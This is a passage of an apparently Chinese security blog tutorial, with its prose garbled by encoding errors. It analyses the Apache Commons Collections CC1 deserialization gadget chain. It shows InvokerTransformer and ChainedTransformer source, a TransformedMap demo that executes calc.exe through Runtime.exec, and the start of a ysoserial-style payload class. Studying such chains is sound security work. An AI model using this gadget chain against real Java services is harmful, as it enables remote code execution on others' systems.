&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#75af00">InvokerTransformer&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">String&lt;/span> &lt;span style="color:#111">methodName&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">Class&lt;/span>&lt;span style="color:#f92672">[]&lt;/span> &lt;span style="color:#111">paramTypes&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">Object&lt;/span>&lt;span style="color:#f92672">[]&lt;/span> &lt;span style="color:#111">args&lt;/span>&lt;span style="color:#f92672">){&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">super&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">iMethodName&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">methodName&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">iParamTypes&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">paramTypes&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">iArgs&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">args&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>ç¬¬ä¸€ä¸ªå‚æ•°æ˜¯å¾…æ‰§è¡Œçš„æ–¹æ³•åï¼Œç¬¬äºŒä¸ªå‚æ•°æ˜¯æ–¹æ³•çš„å‚æ•°ç±»å‹ï¼Œç¬¬ä¸‰ä¸ªæ˜¯ä¼ å…¥çš„å‚æ•°&lt;/p>
&lt;p>ä¹‹åçš„å›è°ƒtransformæ–¹æ³•æ‰§è¡Œinputå¯¹è±¡çš„iMethodNameæ–¹æ³•&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#111">Object&lt;/span> &lt;span style="color:#75af00">transform&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">Object&lt;/span> &lt;span style="color:#111">input&lt;/span>&lt;span style="color:#f92672">){&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">if&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">input&lt;/span> &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#00a8c8">null&lt;/span>&lt;span style="color:#f92672">){&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#00a8c8">null&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">try&lt;/span>&lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">Class&lt;/span> &lt;span style="color:#111">cls&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">input&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getClass&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">Method&lt;/span> &lt;span style="color:#111">method&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">cls&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getMethod&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">iMethodName&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">iParamTypes&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#111">method&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">invoke&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">input&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">iArgs&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>&lt;span style="color:#00a8c8">catch&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">NoSuchMethodException&lt;/span> &lt;span style="color:#111">ex&lt;/span>&lt;span style="color:#f92672">){&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">throw&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">FunctorException&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;InvokerTransformer: The method &amp;#39;&amp;#34;&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#111">iMethodName&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#d88200">&amp;#34;&amp;#39; on &amp;#39;&amp;#34;&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#111">input&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getClass&lt;/span>&lt;span style="color:#f92672">()&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#d88200">&amp;#34;&amp;#39; does not exist&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>&lt;span style="color:#00a8c8">catch&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">IllegalAccessException&lt;/span> &lt;span style="color:#111">ex&lt;/span>&lt;span style="color:#f92672">){&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">throw&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">FunctorException&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;InvokerTransformer: The method &amp;#39;&amp;#34;&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#111">iMethodName&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#d88200">&amp;#34;&amp;#39; on &amp;#39;&amp;#34;&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#111">input&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getClass&lt;/span>&lt;span style="color:#f92672">()&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#d88200">&amp;#34;&amp;#39; cannot be accessed&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>&lt;span style="color:#00a8c8">catch&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">InvocationTargetException&lt;/span> &lt;span style="color:#111">ex&lt;/span>&lt;span style="color:#f92672">){&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">throw&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">FunctorException&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;InvokerTransformer: The method &amp;#39;&amp;#34;&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#111">iMethodName&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#d88200">&amp;#34;&amp;#39; on &amp;#39;&amp;#34;&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#111">input&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getClass&lt;/span>&lt;span style="color:#f92672">()&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#d88200">&amp;#34;&amp;#39; threw an exception&amp;#34;&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">ex&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;ul>
&lt;li>&lt;code>ChainedTransformer&lt;/code>&lt;/li>
&lt;/ul>
&lt;p>ä¹Ÿæ˜¯ä¸€ä¸ªå®ç°äº†Transformeræ¥å£çš„ç±»ï¼Œä½œç”¨æ˜¯å°†å†…éƒ¨å¤šä¸ªTransformerä¸²åœ¨ä¸€èµ·&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#75af00">ChainedTransformer&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">Transformer&lt;/span>&lt;span style="color:#f92672">[]&lt;/span> &lt;span style="color:#111">transformers&lt;/span>&lt;span style="color:#f92672">){&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">super&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">iTransformers&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">transformers&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#111">Object&lt;/span> &lt;span style="color:#75af00">transform&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">Object&lt;/span> &lt;span style="color:#111">object&lt;/span>&lt;span style="color:#f92672">){&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">for&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#00a8c8">int&lt;/span> &lt;span style="color:#111">i&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">0&lt;/span>&lt;span style="color:#f92672">;&lt;/span> &lt;span style="color:#111">i&lt;/span> &lt;span style="color:#f92672">&amp;lt;&lt;/span> &lt;span style="color:#111">iTransformers&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">length&lt;/span>&lt;span style="color:#f92672">;&lt;/span> &lt;span style="color:#111">i&lt;/span>&lt;span style="color:#f92672">++){&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">object&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">iTransformers&lt;/span>&lt;span style="color:#f92672">[&lt;/span>&lt;span style="color:#111">i&lt;/span>&lt;span style="color:#f92672">].&lt;/span>&lt;span style="color:#75af00">transform&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">object&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#111">object&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>å‰ä¸€ä¸ªå›è°ƒè¿”å›çš„ç»“æœå¯ä»¥ä½œä¸ºåä¸€ä¸ªå›è°ƒçš„å‚æ•°ä¼ å…¥&lt;/p>
&lt;h3 id="demo">demo&lt;/h3>
&lt;p>ç„¶åå†æ¥çœ‹demo&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">testCC1&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">static&lt;/span> &lt;span style="color:#00a8c8">void&lt;/span> &lt;span style="color:#75af00">main&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">String&lt;/span>&lt;span style="color:#f92672">[]&lt;/span> &lt;span style="color:#111">args&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#00a8c8">throws&lt;/span> &lt;span style="color:#111">Exception&lt;/span>&lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">Transformer&lt;/span>&lt;span style="color:#f92672">[]&lt;/span> &lt;span style="color:#111">transformers&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">Transformer&lt;/span>&lt;span style="color:#f92672">[]{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">ConstantTransformer&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">Runtime&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getRuntime&lt;/span>&lt;span style="color:#f92672">()),&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">InvokerTransformer&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;exec&amp;#34;&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">Class&lt;/span>&lt;span style="color:#f92672">[]{&lt;/span>&lt;span style="color:#111">String&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">class&lt;/span>&lt;span style="color:#f92672">},&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">Object&lt;/span>&lt;span style="color:#f92672">[]{&lt;/span>&lt;span style="color:#d88200">&amp;#34;calc.exe&amp;#34;&lt;/span>&lt;span style="color:#f92672">}),&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">};&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">Transformer&lt;/span> &lt;span style="color:#111">transformerChain&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">ChainedTransformer&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">transformers&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">Map&lt;/span> &lt;span style="color:#111">innerMap&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">HashMap&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">Map&lt;/span> &lt;span style="color:#111">outerMap&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">TransformedMap&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">decorate&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">innerMap&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#00a8c8">null&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">transformerChain&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">outerMap&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">put&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;test&amp;#34;&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#d88200">&amp;#34;amiz&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>æˆ‘ä»¬åˆ›å»ºäº†ä¸€ä¸ªChainedTransformerï¼ŒåŒ…å«ConstantTransformerï¼ˆå¾—åˆ°Runtimeå¯¹è±¡ï¼‰å’ŒInvokerTransformerï¼ˆæ‰§è¡Œä»£ç éƒ¨åˆ†ï¼‰ï¼Œè¿™ä¸ªChainedTransformeråªæ˜¯ä½œä¸ºå›è°ƒéƒ¨åˆ†ï¼Œæˆ‘ä»¬ç”¨TransformedMap.decorateå¯¹å®ƒè¿›è¡ŒåŒ…è£…ï¼Œæœ€åé€šè¿‡&lt;code>outerMap.put&lt;/code> å‘Mapä¸­æ”¾å…¥æ–°å…ƒç´ è§¦å‘å›è°ƒï¼Œè¿›è€Œæ‰§è¡Œå‘½ä»¤&lt;/p>
&lt;h3 id="transformedmap">TransformedMap&lt;/h3>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">package&lt;/span> &lt;span style="color:#111">ysoserial.payloads&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">org.apache.commons.collections.Transformer&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">org.apache.commons.collections.functors.ChainedTransformer&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">org.apache.commons.collections.functors.ConstantTransformer&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">org.apache.commons.collections.functors.InvokerTransformer&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">org.apache.commons.collections.map.TransformedMap&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">java.io.ByteArrayInputStream&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">java.io.ByteArrayOutputStream&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">java.io.ObjectInputStream&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">java.io.ObjectOutputStream&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">java.lang.annotation.Retention&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">java.lang.reflect.Constructor&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">java.lang.reflect.InvocationHandler&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">java.util.HashMap&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">java.util.Map&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">testCC1&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">static&lt;/span> &lt;span style="color:#00a8c8">void&lt;/span> &lt;span style="color:#75af00">main&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">String&lt;/span>&lt;span style="color:#f92672">[]&lt;/span> &lt;span style="color:#111">args&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#00a8c8">throws&lt;/span> &lt;span style="color:#111">Exception&lt;/span>&lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">Transformer&lt;/span>&lt;span style="color:#f92672">[]&lt;/span> &lt;span style="color:#111">transformers&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">Transformer&lt;/span>&lt;span style="color:#f92672">[]{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">ConstantTransformer&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">Runtime&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">class&lt;/span>&lt;span style="color:#f92672">),&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">InvokerTransformer&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;getMethod&amp;#34;&lt;/span>&lt;span style="color:#f92672">,&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">Class&lt;/span>&lt;span style="color:#f92672">[]{&lt;/span>&lt;span style="color:#111">String&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">class&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">Class&lt;/span>&lt;span style="color:#f92672">[].&lt;/span>&lt;span style="color:#75af00">class&lt;/span>&lt;span style="color:#f92672">},&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">Object&lt;/span>&lt;span style="color:#f92672">[]{&lt;/span>&lt;span style="color:#d88200">&amp;#34;getRuntime&amp;#34;&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">Class&lt;/span>&lt;span style="color:#f92672">[&lt;/span>&lt;span style="color:#111">0&lt;/span>&lt;span style="color:#f92672">]}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">),&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">InvokerTransformer&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;invoke&amp;#34;&lt;/span>&lt;span style="color:#f92672">,&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">Class&lt;/span>&lt;span style="color:#f92672">[]{&lt;/span>&lt;span style="color:#111">Object&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">class&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">Object&lt;/span>&lt;span style="color:#f92672">[].&lt;/span>&lt;span style="color:#75af00">class&lt;/span>&lt;span style="color:#f92672">},&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">Object&lt;/span>&lt;span style="color:#f92672">[]{&lt;/span>&lt;span style="color:#00a8c8">null&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">Object&lt;/span>&lt;span style="color:#f92672">[&lt;/span>&lt;span style="color:#111">0&lt;/span>&lt;span style="color:#f92672">]}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">),&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">InvokerTransformer&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;exec&amp;#34;&lt;/span>&lt;span style="color:#f92672">,&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">Class&lt;/span>&lt;span style="color:#f92672">[]{&lt;/span>&lt;span style="color:#111">String&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">class&lt;/span>&lt;span style="color:#f92672">},&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">String&lt;/span>&lt;span style="color:#f92672">[]{&lt;/span>&lt;span style="color:#d88200">&amp;#34;calc.exe&amp;#34;&lt;/span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">),&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">};&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">Transformer&lt;/span> &lt;span style="color:#111">transformerChain&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">ChainedTransformer&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">transformers&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
